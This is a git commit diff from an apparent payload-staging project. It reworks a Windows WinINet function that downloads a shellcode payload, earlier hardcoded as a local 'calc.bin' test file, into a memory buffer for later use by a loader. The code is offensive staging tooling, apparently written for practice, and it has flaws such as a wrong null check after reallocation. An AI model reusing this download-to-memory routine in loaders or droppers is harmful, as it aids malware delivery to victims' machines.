88bdbbf528a15f1de38cd38bc16e2582dbb8b417
adh1ka <hafizhadhi27@gmail.com>
2025-08-05 16:48:18 +0700

    ngelanjut getpayloadfromurl

--- payload-staging-web-server/payload-staging-web-server/payload-staging-web-server.cpp
+++ payload-staging-web-server/payload-staging-web-server/payload-staging-web-server.cpp
@@ -2,51 +2,73 @@
 #include <Windows.h>
 #include <wininet.h>
 
-BOOL GetPayloadFromUrl(LPCWSTR szurl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
-	DWORD dwBytesRead = NULL;
+BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
+	DWORD dwBytesRead = 0;
+	PBYTE pBytes = NULL;
+	SIZE_T sSize = 0;
+	const DWORD BUFFER_SIZE = 1024;
 
 	//opening internet session handle
-	HINTERNET hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
+	HINTERNET hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	if (!hInternet) {
 		std::wcerr << L"[!] InternetOpenW Failed with error : " << GetLastError() << std::endl;
 		return FALSE;
 	}
 
 	//opening handle to the payload url
-	HINTERNET hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
 	if (!hInternetFile) {
 		std::wcerr << L"[!] InternetOpenUrlW Failed with error : " << GetLastError() << std::endl;
+		CloseHandle(hInternet);
 		return FALSE;
 	}
 
-	PBYTE pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
-	if (!pTmpBytes) {
+	PBYTE pTmpBuffer = (PBYTE)LocalAlloc(LPTR, 1024);
+	if (!pTmpBuffer) {
+		std::wcerr << L"[!] LocalAlloc failed" << std::endl;
+		InternetCloseHandle(hInternetFile);
+		InternetCloseHandle(hInternet);
 		return FALSE;
 	}
 
 	while (TRUE) {
-		//allocating buffer to payload
-		PBYTE pBytes = (PBYTE)LocalAlloc(LPTR, 272);
-
+		
 		//read the payload
-		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+		if (!InternetReadFile(hInternetFile, pTmpBuffer, BUFFER_SIZE, &dwBytesRead)) {
 			std::wcerr << L"[!] InternetReadFile Failed with error : " << GetLastError() << std::endl;
+			LocalFree(pTmpBuffer);
+			if (pBytes) LocalFree(pBytes);
+			InternetCloseHandle(hInternetFile);
+			InternetCloseHandle(hInternet);
 			return FALSE;
 		}
+
+		if (dwBytesRead == 0) {
+			break;
+		}
+		
+		//reallocate buffer to fit new data
+		PBYTE pNewBytes = (PBYTE)LocalReAlloc(pBytes, sSize + dwBytesRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
+		if (!pBytes) {
+			std::wcerr << L"[!] LocalReAlloc failed with error : " << GetLastError() << std::endl;
+			LocalFree(pTmpBuffer);
+			if (pBytes) LocalFree(pBytes);
+			InternetCloseHandle(hInternetFile);
+			InternetCloseHandle(hInternet);
+			return FALSE;
+		}
+		pBytes = pNewBytes;
+
+		memcpy(pBytes + sSize, pTmpBuffer, dwBytesRead);
 		sSize += dwBytesRead;
 
-		if (!pBytes)
-			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
-		else
-
 	}
+	*pPayloadBytes = pBytes;
+	*sPayloadSize = sSize;
 
 	
-
+	LocalFree(pTmpBuffer);
 	InternetCloseHandle(hInternet);
 	InternetCloseHandle(hInternetFile);
-	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
-	LocalFree(pBytes);
-
 	return TRUE;
 }
